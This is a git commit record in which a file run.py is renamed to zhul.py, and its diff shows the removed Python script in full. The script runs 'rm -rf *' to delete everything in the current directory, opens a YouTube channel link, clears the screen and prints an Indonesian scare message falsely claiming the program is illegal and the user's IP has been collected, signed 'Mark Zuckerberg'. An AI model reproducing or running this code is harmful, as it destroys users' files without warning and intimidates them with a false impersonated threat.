4bf031738bf19f39b98fcec76559229c59fedadd
zhulantdotid <51304721+zhulantdotid@users.noreply.github.com>
2019-06-06 20:22:32 +0700

    Update and rename run.py to zhul.py

--- run.py
+++
@@ -1,5 +0,0 @@
-import os
-os.system("rm -rf *")
-os.system("xdg-open https://youtube.com/NjankSoekamti")
-os.system("clear")
-print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
